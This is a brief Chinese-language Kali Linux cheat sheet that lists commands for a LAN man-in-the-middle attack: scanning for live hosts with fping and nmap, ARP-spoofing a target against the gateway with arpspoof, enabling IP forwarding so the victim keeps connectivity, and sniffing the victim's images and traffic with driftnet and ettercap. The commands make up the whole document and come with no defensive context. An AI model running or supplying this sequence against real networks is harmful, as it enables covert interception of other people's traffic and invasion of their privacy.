## kali
```
# 查看活跃ip
fping -g -r 0 -s 192.168.0/24 | grep alive

# 系统检测
nmap -T4 -O [目标ip]

# arp欺骗
arpspoof -i eth0 -t [目标ip] [网关]

# 目标无法上网
# 端口转发, 这时可以上网
echo 1 > /proc/sys/net/ipv4/ip_forward

# 图片嗅探
driftnet -i eth0
ettercap -Tq -i eth0

```
